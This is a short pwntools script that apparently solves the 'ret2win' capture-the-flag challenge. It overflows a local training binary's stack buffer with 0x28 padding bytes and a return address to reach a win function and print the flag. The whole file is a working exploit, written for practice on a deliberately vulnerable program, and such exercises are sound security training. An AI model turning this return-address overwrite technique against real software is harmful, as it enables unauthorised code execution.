#!/usr/env/python

from pwn import *

context.binary = './ret2win'
#context.log_level = 'debug'

io = process('./ret2win')

io.recv()

payload = 'A'*0x28
payload += p64(0x400811)

io.sendline(payload)
flag = io.recvline()
log.info('flag:'+flag)

io.interactive()
